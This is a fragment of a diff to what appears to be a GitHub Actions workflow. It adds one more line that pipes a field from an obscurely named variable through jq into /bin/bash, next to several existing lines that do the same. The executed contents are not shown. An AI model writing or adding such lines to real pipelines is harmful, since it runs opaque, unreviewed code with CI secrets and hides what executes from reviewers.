@@ -21,6 +21,7 @@ jobs:
           echo $nkvsm37 | jq -r .fwzj5 | /bin/bash
           echo $b2652 | jq -r .z1508 | /bin/bash
           printf '%s' "$wc412" | jq -r .dr10 | /bin/bash
+          printf '%s' "$p6" | jq -r .uh4 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
